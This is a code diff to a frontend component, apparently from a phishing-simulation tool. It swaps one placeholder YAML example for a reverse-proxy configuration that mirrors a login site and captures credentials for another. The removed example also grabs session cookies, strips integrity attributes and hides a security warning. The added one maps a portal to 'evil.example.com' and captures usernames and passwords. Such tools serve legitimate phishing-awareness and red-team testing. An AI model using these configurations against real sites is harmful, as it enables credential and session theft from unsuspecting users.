@@ -62,39 +62,18 @@
 		name: null
 	};
 
-	const currentExample = `version: "0.0" # config version
-proxy: 172.20.0.138:8081 # proxy server address
-global: # rules applied to all domains
-    rewrite:
-        - name: loose rename integrity # required identifier
-          find: integrity=
-          replace: data-no-integrity=
-          from: response_body # where to apply
-login.example.com: # original domain
-    to: login.phishingclub.test # proxy domain
-    capture:
-        - name: username # required identifier
-          method: POST # http method
-          path: /auth # url path pattern
-          find: username=([^&]+) # regex pattern to capture
-          from: request_body # where to search: request_body|request_header|response_body|response_header|cookie|any
-        - name: password # required identifier
-          method: POST # http method
-          path: /auth # url path pattern
-          find: password=([^&]+) # regex pattern to capture
-          from: request_body # where to search
-        - name: session_token # required identifier
-          method: GET # http method
-          path: /dashboard # url path pattern
-          find: SESSIONID # cookie name to capture
-          from: cookie # captures full cookie data
-    rewrite:
-        - name: hide_warning # required identifier
-          find: security-warning # text/pattern to find
-          replace: hidden # replacement text
-          from: response_body # where to apply: request_body|request_header|response_body|response_header|any
-www.example.com: # original domain
-    to: www.phishingclub.test # proxy domain`;
+	const currentExample = `version: "0.0"
+proxy: "My Proxy Campaign"
+
+portal.example.com:
+  to: "evil.example.com"
+  capture:
+    - name: "credentials"
+      method: "POST"
+      path: "/login"
+      find: "username=([^&]+).*password=([^&]+)"
+      from: "request_body"
+      required: true`;
 
 	$: {
 		modalText = getModalText('Proxy', modalMode);
@@ -442,6 +421,7 @@ www.example.com: # original domain
 									height="large"
 									language="yaml"
 									placeholder={currentExample}
+									enableProxyCompletion={true}
 								/>
 							</div>
 						</div>
